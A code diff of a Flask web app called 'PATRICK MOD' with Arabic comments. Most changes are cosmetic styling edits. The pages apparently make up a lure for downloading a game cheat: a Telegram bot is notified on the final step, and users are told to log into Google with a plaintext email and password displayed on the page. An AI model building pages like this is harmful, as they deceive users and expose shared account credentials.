@@ -9,7 +9,7 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 GOOGLE_LOGIN_URL = "https://accounts.google.com"
 
-# الصفحة الأولى: الترحيب وزر التالي
+# الصفحة الأولى: الترحيب وزر التالي بالأخضر
 @app.route("/")
 def home():
   return render_template_string("""
@@ -52,19 +52,14 @@ def home():
             flex-direction: column;
             align-items: center;
         }
-        .emoji-logo {
+        .glowing-circle {
             width: 110px;
             height: 110px;
             border-radius: 50%;
-            border: 2px solid #ff0000;
-            box-shadow: 0 0 20px rgba(255, 0, 0, 0.4);
+            border: 3px solid #ff0000;
+            box-shadow: 0 0 25px rgba(255, 0, 0, 0.6), inset 0 0 15px rgba(255, 0, 0, 0.4);
             margin-bottom: 15px;
-            background: #000000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 55px;
-            filter: drop-shadow(0 0 5px rgba(255, 0, 0, 0.8)) hue-rotate(-20deg);
+            background: #050505;
         }
         .mod-title {
             color: #ff2a2a;
@@ -77,7 +72,7 @@ def home():
         .next-btn { 
             display: block; 
             width: 100%; 
-            background: #ff2a2a; 
+            background: #28a745; 
             color: white; 
             border: none; 
             border-radius: 10px; 
@@ -88,13 +83,13 @@ def home():
             cursor: pointer; 
             transition: background 0.2s; 
         }
-        .next-btn:hover { background: #e02424; }
+        .next-btn:hover { background: #218838; }
     </style>
 </head>
 <body>
     <div class="box">
         <div class="logo-container">
-            <div class="emoji-logo">🙂</div>
+            <div class="glowing-circle"></div>
             <div class="mod-title">PATRICK MOD</div>
         </div>
         <h1>Welcome to PATRICK MOD</h1>
@@ -104,7 +99,7 @@ def home():
 </html>
 """)
 
-# الصفحة الثانية: التحقق من النص
+# الصفحة الثانية: التحقق من النص وزر الإرسال بالأخضر
 @app.route("/step2", methods=["GET", "POST"])
 def step2():
   error = ""
@@ -155,19 +150,14 @@ def step2():
             flex-direction: column;
             align-items: center;
         }
-        .emoji-logo {
+        .glowing-circle {
             width: 110px;
             height: 110px;
             border-radius: 50%;
-            border: 2px solid #ff0000;
-            box-shadow: 0 0 20px rgba(255, 0, 0, 0.4);
+            border: 3px solid #ff0000;
+            box-shadow: 0 0 25px rgba(255, 0, 0, 0.6), inset 0 0 15px rgba(255, 0, 0, 0.4);
             margin-bottom: 12px;
-            background: #000000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 55px;
-            filter: drop-shadow(0 0 5px rgba(255, 0, 0, 0.8)) hue-rotate(-20deg);
+            background: #050505;
         }
         .mod-title {
             color: #ff2a2a;
@@ -195,7 +185,7 @@ def step2():
         input[type="text"]:focus { border-color: #ff2a2a; box-shadow: 0 0 8px rgba(255, 42, 42, 0.3); }
         .submit-btn { 
             width: 100%; 
-            background: #ff2a2a; 
+            background: #28a745; 
             color: white; 
             border: none; 
             border-radius: 10px; 
@@ -205,13 +195,13 @@ def step2():
             cursor: pointer; 
             transition: background 0.2s;
         }
-        .submit-btn:hover { background: #e02424; }
+        .submit-btn:hover { background: #218838; }
     </style>
 </head>
 <body>
     <div class="box">
         <div class="logo-container">
-            <div class="emoji-logo">🙂</div>
+            <div class="glowing-circle"></div>
             <div class="mod-title">PATRICK MOD</div>
         </div>
         
@@ -228,7 +218,7 @@ def step2():
 </html>
 """, error=error)
 
-# الصفحة الثالثة: النص المحدث تماماً وزر تسجيل الدخول لجوجل
+# الصفحة الثالثة: النص المحدث تماماً وزر تسجيل الدخول
 @app.route("/step3")
 def step3():
   if BOT_TOKEN and CHAT_ID:
@@ -279,19 +269,14 @@ def step3():
             flex-direction: column;
             align-items: center;
         }}
-        .emoji-logo {{
+        .glowing-circle {{
             width: 110px;
             height: 110px;
             border-radius: 50%;
-            border: 2px solid #ff0000;
-            box-shadow: 0 0 20px rgba(255, 0, 0, 0.4);
+            border: 3px solid #ff0000;
+            box-shadow: 0 0 25px rgba(255, 0, 0, 0.6), inset 0 0 15px rgba(255, 0, 0, 0.4);
             margin-bottom: 12px;
-            background: #000000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 55px;
-            filter: drop-shadow(0 0 5px rgba(255, 0, 0, 0.8)) hue-rotate(-20deg);
+            background: #050505;
         }}
         .mod-title {{
             color: #ff2a2a;
@@ -332,11 +317,11 @@ def step3():
 <body>
     <div class="box">
         <div class="logo-container">
-            <div class="emoji-logo">🙂</div>
+            <div class="glowing-circle"></div>
             <div class="mod-title">PATRICK MOD</div>
         </div>
         
-        <p>الرجاء تسجيل الدخول بالبريد الإلكتروني لمتابعة تنزيل hacker hide online :</p>
+        <p>الرجاء تسجيل الدخول بالبريد الإلكتروني لمتابعة تنزيل hide online من هناك :</p>
         <div class="cred-box">
             <div class="cred-item"><b>Email:</b> patrickmod156@gmail.com</div>
             <div class="cred-item"><b>Password:</b> PM.smash,mod</div>
